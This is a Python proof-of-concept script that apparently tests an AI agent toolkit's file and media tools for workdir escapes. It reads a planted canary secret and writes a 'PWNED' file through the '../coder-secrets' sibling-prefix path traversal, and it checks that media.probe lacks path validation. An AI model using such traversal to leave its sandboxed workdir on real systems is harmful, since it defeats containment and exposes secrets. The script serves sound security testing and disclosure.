"""PoC: (A) files._resolve sibling-prefix escape via str.startswith; (B) media.probe no path validation.
Pure-logic, deterministic, synthetic canary."""
import asyncio, os, sys, tempfile, pathlib
sys.path.insert(0, r"C:\AiMaxBossman-claude-bossman-control-v03-43igbk\bossman-core")
os.environ.setdefault("SANDBOX_MODE","docker")
from bossman.toolkit import ToolContext, files

tmp = pathlib.Path(tempfile.mkdtemp(prefix="bossman_sib_"))
ws = tmp / "workspace"
coder = ws / "coder"; coder.mkdir(parents=True)
sibling = ws / "coder-secrets"; sibling.mkdir()      # sibling dir whose name shares prefix "coder"
(sibling / "s.txt").write_text("BOSSMAN_TEST_SECRET_9F31A7\n")
ctx = ToolContext(agent="coder", run_id=1, workdir=coder)

print("=== A: files._resolve sibling-prefix escape ===")
try:
    r = asyncio.run(files.fs_read({"path": "../coder-secrets/s.txt"}, ctx))
    print("fs.read ../coder-secrets/s.txt ->", repr(r.content), "ERROR" if r.error else "OK")
    print("  VERDICT:", "EXPLOITABLE (read outside workdir)" if "9F31A7" in r.content else "blocked")
except PermissionError as e:
    print("fs.read -> BLOCKED", e)

# also write outside workdir into sibling
try:
    r = asyncio.run(files.fs_write({"path": "../coder-secrets/pwned.txt", "content": "PWNED"}, ctx))
    print("fs.write ../coder-secrets/pwned.txt ->", repr(r.content))
    print("  file exists outside workdir:", (sibling / "pwned.txt").exists())
except PermissionError as e:
    print("fs.write -> BLOCKED", e)

print("=== B: media.probe path (code path check only, no ffprobe needed) ===")
from bossman.toolkit import media
# Show that probe builds path with NO _path_arg_ok validation, unlike ffmpeg
import inspect
src = inspect.getsource(media.probe)
print("probe validates path via _path_arg_ok:", "_path_arg_ok" in src)
p = (coder / "../coder-secrets/s.txt")
print("probe would resolve to:", str(p.resolve()))
print("  escapes workdir:", not str(p.resolve()).startswith(str(coder.resolve())))
print("TMP", tmp)
